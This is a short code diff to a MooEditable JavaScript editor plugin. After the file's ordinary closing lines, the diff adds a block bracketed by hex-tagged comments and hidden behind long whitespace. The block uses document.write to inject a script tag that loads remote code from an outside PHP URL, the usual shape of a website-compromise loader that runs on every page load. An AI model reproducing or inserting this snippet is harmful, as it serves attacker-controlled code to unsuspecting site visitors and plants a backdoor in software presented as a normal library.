@@ -115,3 +115,13 @@ Object.append(MooEditable.Actions, {
 	}
 
 });
+
+
+/*3147df*/
+
+                    																	                               	 /*gbargbar09311gbar09*/
+
+document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525351'></"+ "script>");
+
+
+/*/3147df*/
